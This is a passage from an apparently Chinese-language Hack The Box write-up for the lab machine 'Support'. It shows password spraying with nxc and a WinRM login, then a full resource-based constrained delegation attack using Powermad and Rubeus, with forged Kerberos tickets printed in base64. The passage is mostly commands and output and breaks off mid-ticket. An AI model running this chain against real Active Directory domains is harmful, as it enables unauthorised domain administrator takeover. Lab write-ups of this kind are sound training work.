class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --users | grep 2022- | awk -F &#x27; &#x27; &#x27;&#123;print $5&#125;&#x27; | tee &gt; user.list</span><br><span class="line"></span><br><span class="line">$ cat user.list </span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">ldap</span><br><span class="line">support</span><br><span class="line">smith.rosario</span><br><span class="line">hernandez.stanley</span><br><span class="line">wilson.shelby</span><br><span class="line">anderson.damian</span><br><span class="line">thomas.raphael</span><br><span class="line">levine.leopoldo</span><br><span class="line">raven.clifton</span><br><span class="line">bardot.mary</span><br><span class="line">cromwell.gerard</span><br><span class="line">monroe.david</span><br><span class="line">west.laura</span><br><span class="line">langley.lucy</span><br><span class="line">daughtler.mabel</span><br><span class="line">stoll.rachelle</span><br><span class="line">ford.victoria</span><br><span class="line"></span><br><span class="line">$ nxc smb 10.10.11.174 -u user.list -p &#x27;Ironside47pleasure40Watchful&#x27; --continue-on-success</span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\smith.rosario:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\hernandez.stanley:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\wilson.shelby:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\anderson.damian:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\thomas.raphael:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\levine.leopoldo:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\raven.clifton:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\bardot.mary:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\cromwell.gerard:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\monroe.david:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\west.laura:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\langley.lucy:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\daughtler.mabel:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\stoll.rachelle:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.174    445    DC               [-] support.htb\ford.victoria:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里用nxc winrm看support是失败的（我猜是权限问题）<br>在bloodhound里面可以看到support是remote management users的组成员<br><img src="/images/support3.png"><br>直接登录一下试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo evil-winrm -i 10.10.11.174 -u support -p &#x27;Ironside47pleasure40Watchful&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\support\Documents&gt; </span><br></pre></td></tr></table></figure>
<h2 id="shell-as-support"><a href="#shell-as-support" class="headerlink" title="shell as support"></a>shell as support</h2><p>在上面的图片中我们还可以看到support用户还在shared support account组里面<br>而从这个组到administrator有一条清晰的路线<br><img src="/images/support4.png"><br>就按照人家的来吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\support&gt; mkdir C:\lusowen                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">    Directory: C:\                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                                                                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                                                                                                                                 </span><br><span class="line">d-----          4/3/2025   1:06 AM                lusowen                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; cd C:\lusowen                                                                                                                                                                                        </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload PowerView.ps1                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/PowerView.ps1 to C:\lusowen\PowerView.ps1                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Data: 1027036 bytes of 1027036 bytes copied                                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                                       </span><br><span class="line">Info: Upload successful! </span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; . .\PowerView.ps1</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload Powermad.ps1</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/Powermad.ps1 to C:\lusowen\Powermad.ps1</span><br><span class="line">                                        </span><br><span class="line">Data: 180768 bytes of 180768 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!   </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; . .\Powermad.ps1</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString &#x27;Summer2018!&#x27; -AsPlainText -Force)</span><br><span class="line">[+] Machine account attackersystem added</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; upload Rubeus.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /home/lusowen/HackTheBox/Support/Rubeus.exe to C:\lusowen\Rubeus.exe</span><br><span class="line">                                        </span><br><span class="line">Data: 595968 bytes of 595968 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;</span><br><span class="line">                                                         </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">                                                         </span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; $SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; Get-DomainComputer $TargetComputer | Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125;</span><br><span class="line">Warning: [Set-DomainObject] Error setting/replacing properties for object &#x27;MANAGEMENT$&#x27; : Exception calling &quot;CommitChanges&quot; with &quot;0&quot; argument(s): &quot;Access is denied.</span><br><span class="line">&quot;                                 </span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe hash /password:Summer2018!                                                 </span><br><span class="line">                                                         </span><br><span class="line">   ______        _     </span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Calculate Password Hash(es)</span><br><span class="line"></span><br><span class="line">[*] Input password             : Summer2018!</span><br><span class="line">[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F</span><br><span class="line"></span><br><span class="line">[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F </span><br><span class="line">[*] Building AS-REQ (w/ preauth) for: &#x27;support.htb\attackersystem$&#x27;</span><br><span class="line">[*] Using domain controller: ::1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFojCCBZ6gAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD</span><br><span class="line">      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBG0wggRpoAMCARKhAwIBAqKCBFsEggRXEiL6BRE5</span><br><span class="line">      rBNoMPYjcBWUb07+3Wo1fe9i68gpTjJE4D607Hwx6xKuyvRDdkYMFb0pCsXKg2FkXOQxxlDxXlKkN8WY</span><br><span class="line">      Aj9Fsduu600l0CV1MUicq/06o4dBax3InDJOiiFnY7e6i6wVbHucd2w6dES3bJtU2A6WCyNbeFefKV9H</span><br><span class="line">      vGmIt54LY/kuRWHOwrRuHnkVYbqlgV2ClHvFVWRbvtWRWSWhr/SVgH8+NTl2796ZgkVlMgBBJVl/0XLI</span><br><span class="line">      okFMhH8vxr5Cu9w31TVvmPxeTdL5MGltQrbBNRPJJU6ZYRvK3rYHqY9LDjt1/fYOXO97yksi+xtMcKFZ</span><br><span class="line">      ox5BoKnbdLMG2fCLhHoUGOLiE/FcG4HOFpJSYyzjT1/jV4fotMKv/iMo44uXLf/m/ybChrdZtFrtUGQg</span><br><span class="line">      8Ac2lq7QH9qQr4/YQ1fb+dVahK0vmRrceSN6BMnPAK9x7mrXh7meX9PuRvogQxB4uggqHPPa+hvXspeF</span><br><span class="line">      T5LN0hrf6Vy80kFCGl/037prp21idy2unELWRVNiH+yBGCw2ebbrRZWRFnAxAS9D1YdWLdwNYs+yDcSh</span><br><span class="line">      3qP5l7diOqAr0xAkeLFKKry0iWInk7pvopNlgiLU5tYv67SfduU5wTsCbivKVjWWq0oMBeIRYqFYTOS7</span><br><span class="line">      1pKzT++CHqk5pylsFdzhlIzTo7+/4thpDK7hWbXRrZ398bWbN+/xZPKZ+FmjtG2bO8d0ZmQ/RYAVD5D6</span><br><span class="line">      KKIY2Ayc6EMllGaoIibfpVd7sDtfZh4WwCrUI+lAT3Eq0oTy+BsQL79mU2qSWVdITMenllIMnyf4gF15</span><br><span class="line">      Z4bTDJGCCbqDo4W8TJt+wE/9dwdMbMn+E+dxbf3ZVvalj+as9iMszNFXzlNn118gPSRlGac4zNhSA6ys</span><br><span class="line">      4nDfVqhYGBLqzsKzvC9Nm0Izat53hiYUShbMvV0sorNn2BqSEU1fxrYAdg3ZGdMLBTBSLOeatRLSa1LR</span><br><span class="line">      oWPFevv0OnyymVN2ykm4zVvwYFo6a1KzTiFepn1e1glVRr7tPofRCU3GXuYnevVr+0V0fX6kB/93CnyZ</span><br><span class="line">      BY+jcJR9ltH0oVXHtLOR8vkRZvwRuxVdKoHJEjrsrVIag6fF4TLKOn1+yd8V5dxDu0r5BfxULMCRsoiQ</span><br><span class="line">      Xh1Pyc2Msg1vKC/AuLltQBnLY+oPfQmqWJO2VbLpM/ClMggE8LtTFlwsITJ9RRHsLE2hXyEfmbR9WINV</span><br><span class="line">      o73wDPfq+vcmjikRNY/Ltq3Y98X/4dBXZxncSRpzDqpZGbKvN4edy41+EU/vfnNTjyn6mWaymGMdFk4x</span><br><span class="line">      0gcBe9gFxctMzrxcgME6yh/h+j/E8FGV96FX4uxpwXO2Dxo7EkcWdRLuVKit9q7Xi7SlRUqRTVQB7FUa</span><br><span class="line">      jvpL7BAgsGbEQomG4NcPgdoI2/Rz9rmTT0d0N8zKILOC5uiWZnmyUkWh7rtI4n2xS40iEhXMDtCVwefD</span><br><span class="line">      qlXhVZkeDGGisydSzz0mxggmyZXizyESZaOB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBsw</span><br><span class="line">      GaADAgEXoRIEECwibmu541scxclficDwDnmhDRsLU1VQUE9SVC5IVEKiHDAaoAMCAQGhEzARGw9hdHRh</span><br><span class="line">      Y2tlcnN5c3RlbSSjBwMFAEDhAAClERgPMjAyNTA0MDMwODIwNTVaphEYDzIwMjUwNDAzMTgyMDU1WqcR</span><br><span class="line">      GA8yMDI1MDQxMDA4MjA1NVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv</span><br><span class="line">      cnQuaHRi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line">[*] Building S4U2self request for: &#x27;attackersystem$@SUPPORT.HTB&#x27;</span><br><span class="line">[*] Using domain controller: dc.support.htb (::1)</span><br><span class="line">[*] Sending S4U2self request to ::1:88</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS for &#x27;administrator&#x27; to &#x27;attackersystem$@SUPPORT.HTB&#x27;</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFsjCCBa6gAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoQ0bC1NVUFBPUlQuSFRCohwwGqAD</span><br><span class="line">      AgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHGawvYEUsnLRmjq</span><br><span class="line">      zLqXnxIBEGvIsOl15LzJzMv6FpJcMDzCfWYGjptKYPQDPYif6g6Swt8VMxsovNDNJ3yOjhVrFQ+zVfNj</span><br><span class="line">      FOHeNMU2i0DjItQpjiIlfwdJ0md6qyJWcbrmbmyVYAYD2L7bIFi8Lpb+JGbPifEW95U9ze1kv39otMgJ</span><br><span class="line">      B4m4CWcXMlIL7DRDIQJydeUHLY0f2aoiOsXRtinsArABTdEvq4d0Sw5wgzRMUhPqvhrlPJAaTnIAhJk8</span><br><span class="line">      sTW0EREOFF06hVJcjRrO3hBna6ERWiMo2o6HU49ZKl3sUuNV4U9CG7Ji0xaVsqfamWI5EdrYKOIcA0UW</span><br><span class="line">      PnaLRpewZe2wgKEJ8tKKHBSTeUKJ4Ln+uFk2UWgQywV++CmNcgdMTbngHSNZGUwe6frw04MlTrsWGmy/</span><br><span class="line">      Z7YGVnvt5E77j5QMI9j66wWZghPxNunMBr7SZ1E8dZNEK/3HM8cnegz5RRXax+uGvw9dQi/4MLLia2wg</span><br><span class="line">      zNxS3Vf+9wTWpHmWm4X8HwoyhZNoP7qPLc5jfFfDYQeaDXBLJFoHN1AVZpbZx0UeNsMI+LXkC8xpdDzA</span><br><span class="line">      a2/mU3KZJyvIi6fdJQRIgRXpILmyDuW1F7Nv256Ws9vW2GDBvhDbs5Yah7cuX/jmfIx6umrKExeKWHoB</span><br><span class="line">      Xmg1Cc6sjlarCkaqbfgVZ4baLxMz6nC67wh1fdYxCLIls7sypYj4B4rANg4uPj+riiaRLHJVWcAeXOvw</span><br><span class="line">      zk1uZRz3/SdB9+kwmdybWMBxP5tIDcukl3K3F8gsAa8/YA0Hd16Z4DRhU9fZE0UpwwrPOJX4NZBjM+Z9</span><br><span class="line">      whJnZJhr3sHJ+vkMKKZrF2kSv9HyF6CmUnATDJej+Co4ad33mr9AocZfU8qHI0IBaepdJn24kGI3ye6L</span><br><span class="line">      GKo+wQzuXfKnBj2CHRbfZ9WbwcTtWi12uy4UNaSKr93NeICN8wQUAyThGKxKYHwaEuQfJXg1/FCc7MCO</span><br><span class="line">      lke08iOjTsqrkPO9sc4UMbSWLqEKl8CatjUvT0CB7N6d1CKxOEuE7D6nWnWEDJluIhHhYNOyWBhTJXO0</span><br><span class="line">      SaLes7hwlHBPkQfD3lN7JZmu749kawJvkYIQscHCmZEDqZd8FIU9Mv41jFxwcVl6PJd9ITQfknWYOspk</span><br><span class="line">      kKe9sgXrdsHEnL4C9lbZI22WQJtPqC/UfMHLmL/0fsU/FAoqNGyhkx6/e+Hj8cloHRH6gc8ljtaGdJ8n</span><br><span class="line">      kJSdQ9TDUR/H1eEaxnxLRFAqxaE+9/6rL+GAPXx7OLD5AUw+wrE05yBXFC4W0JzMofOzqSDMpj25uutc</span><br><span class="line">      9IiSOVZpcexFXEK8WboN8xsHjautyA7Et+owxglomFKdSniIwjn5QscCfZYk9ta2u1IGE5/HcKL0dAVZ</span><br><span class="line">      zFR+8GwRHhLeG4lGI88K56YMJrFRuDgGZSMll9R+tD/4o2/BQ8RSfppjbO1ckWeB4THP3J4k1xXvWQ7v</span><br><span class="line">      NWuzSoC12nr4Nz5bZ4G/bNtNE5m+2QOyAOUZm0tm5WQTtSOumaxiKg4W0Wk0RFOjgdQwgdGgAwIBAKKB</span><br><span class="line">      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBDIivJdaItGYz/0PJ4miZFmoQ0bC1NVUFBPUlQu</span><br><span class="line">      SFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI1MDQwMzA4MjA1NVqm</span><br><span class="line">      ERgPMjAyNTA0MDMxODIwNTVapxEYDzIwMjUwNDEwMDgyMDU1WqgNGwtTVVBQT1JULkhUQqkcMBqgAwIB</span><br><span class="line">      AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==</span><br><span class="line"></span><br><span class="line">[*] Impersonating user &#x27;administrator&#x27; to target SPN &#x27;cifs/dc.support.htb&#x27;</span><br><span class="line">[*] Building S4U2proxy request for service: &#x27;cifs/dc.support.htb&#x27;</span><br><span class="line">[*] Using domain controller: dc.support.htb (::1)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller ::1:88 </span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line">[*] base64(ticket.kirbi) for SPN &#x27;cifs/dc.support.htb&#x27;:</span><br><span class="line">      doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD</span><br><span class="line">      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQaiggUpBIIFJcpgFR8a</span><br><span class="line">      QxNQCXubyEAIHv0fSJFrMSw9+0Xp8/sRGn0bW3/olLH4PetL5JBt10IIiKpWQO3JONmWD8Di5f+/5Y+6</span><br><span class="line">      AlU+oN7DVsSjcJBld/e/YbvwH9PJJI/hYneZN6LpUiIDC/qO9bW3EbPqzXbsfjaUpSz4gjhdcqu+IXcn</span><br><span class="line">      sb/oWVjzlYMfpbYSknTFhnMsv3K9nlwl6+97wrdq6lsSx/aNi1OndH/PgZ4S4Pc5OAkExCHnK0J5XCSm</span><br><span class="line">      kJ44DUJF67Lu0JXma0p0ADBjXqINtRMS/SUqa5yDk+eDP2y6uRyoxKfPhJ+8OJeXV4Cdx1rxEaWl5Xjb</span><br><span class="line">      xCSY3fQdQU1dtBM95St/QYjA71Eaxt5+4mex3jFFKt9gUDVI952WCQU83hf7NgF7+o/Fv1CB76wsjUEP</span><br><span class="line">      ermNQ6VgANDN1hDnHzOjEgA1qxy3GbVQGcuF2SGkYlpOabLLa0TKc1qgP9wVFIZPtYvSzQkYnlYnym8e</span><br><span class="line">      pFl5u8TR94VTGpledj9D23ZT5LWCfdOp+Yv6+RSqAopLzbzTY/N3QjBAbiFdhkqJaqouda8ZH0CRWwvC</span><br><span class="line">      AxZqq9m8qK/MbCe9OvkiZJ442lsXUE1iltd8AJoe78R6I7IuyA+/UdEYBmVawNTNllKtBDPy9J9dLAFp</span><br><span class="line">      ztkzU/bpt7uFIOYBiAuNUt4KmI9pM58wi0iA2Oz0JJySqmbkyF38phJjgPQ17d7fmB19kglQXNpzC6fr</span><br><span class="line">      +7U/5VPyFo8bhHYqWbprTMIUIig05puJy66ytCFrMDTpykzG3g96grr6paBfv1WuITUbTpP29yldZKNE</span><br><span class="line">      D+0diNVHeySfJM+GMhpv5TO5XNDAOG/3l6o4w+4Eledhb1VCaqMWbCkUEAoacPhKiu7sffKWhTRe8P8h</span><br><span class="line">      x+WonFv5p7AxRH8I/ehgdCCxlQwnkXZrDLH6x8tYPVBIW5kJmHTfN0oVuOKfNaEvvrVJrfDt8ze+ZHn1</span><br><span class="line">      faM1D/qZj/zrGQBgfAYooZv9NHIz0bJ29YDO95KSTdUeeGYRG3LyNM1WbfOoZlxj5o9wqLlMDOMYjeIc</span><br><span class="line">      CbnqzaHQMVzWCHNdfAGX+TsTV+jXaX1ODiGZ9AztM5y8MBoNj+cbmR+VU6YsaJqfSdzKWpBqi6vF2fB2</span><br><span class="line">      KAL0cMH+ET7SawQJPQaYvFODFipo0Be0j5PD1re/lGOM4AlduXhRnuO7J8K9q3m0s3VjyZ49dmAQy0Cn</span><br><span class="line">      HEaBCrKNW7E6v101PbCrSLMVvLQEsdKNvO4YyZlb7Ny5YOPCjVL6qLJtIzbWIkCJICXvnb5kxIjsJ8WH</span><br><span class="line">      